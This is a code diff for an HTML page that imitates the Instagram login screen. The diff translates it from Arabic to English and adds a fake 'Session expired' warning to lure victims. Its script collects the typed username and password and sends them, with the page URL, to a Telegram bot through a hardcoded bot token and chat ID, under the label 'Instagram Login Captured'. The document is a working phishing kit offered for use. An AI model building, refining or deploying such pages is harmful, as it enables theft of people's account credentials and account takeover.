@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Login • Instagram</title>
     <style>
         body {
             background-color: #fafafa;
@@ -14,19 +14,31 @@
             height: 100vh;
             margin: 0;
         }
-        .login-box {
+        .login-card {
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 1px;
-            padding: 30px 40px;
+            padding: 40px;
             width: 350px;
             text-align: center;
+            box-sizing: border-box;
         }
         .logo {
-            font-family: 'Billabong', sans-serif; /* محاكاة خط إنستغرام أو استخدام صورة الشعار */
-            font-size: 40px;
-            margin: 22px 0;
+            font-family: cursive, sans-serif;
+            font-size: 42px;
+            margin-bottom: 20px;
             font-weight: bold;
+            color: #262626;
+        }
+        .alert-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 10px;
+            font-size: 13px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            line-height: 1.4;
         }
         input {
             width: 100%;
@@ -55,25 +67,46 @@
             padding: 7px;
             margin-top: 10px;
         }
-        .sub-text {
+        .help-text {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+        }
+        .footer-text {
             color: #737373;
-            font-size: 14px;
-            line-height: 18px;
-            margin-bottom: 20px;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .footer-text a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
+    <div class="login-card">
         <div class="logo">Instagram</div>
-        <p class="sub-text">يرجى تسجيل الدخول للتحقق من الحساب واستئناف الجلسة.</p>
         
+        <!-- تنبيه انتهاء الجلسة -->
+        <div class="alert-box">
+            Session expired. Please log in again to continue.
+        </div>
+
         <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
-            <input type="password" id="password" placeholder="كلمة المرور" required>
-            <button type="submit" class="btn">تسجيل الدخول</button>
+            <input type="text" id="username" placeholder="Phone number, email or username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn">Log In</button>
         </form>
+
+        <a href="#" class="help-text">Forgot your login details? Get help logging in.</a>
+        
+        <div class="footer-text">
+            Don't have an account? <a href="#">Sign up.</a>
+        </div>
     </div>
 
     <script>
@@ -85,7 +118,7 @@
             const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatId = "865078178";
             
-            const message = "🚨 بيانات جديدة:\nالمستخدم: " + user + "\nكلمة المرور: " + pass + "\nالرابط: " + window.location.href;
+            const message = "🚨 Instagram Login Captured:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
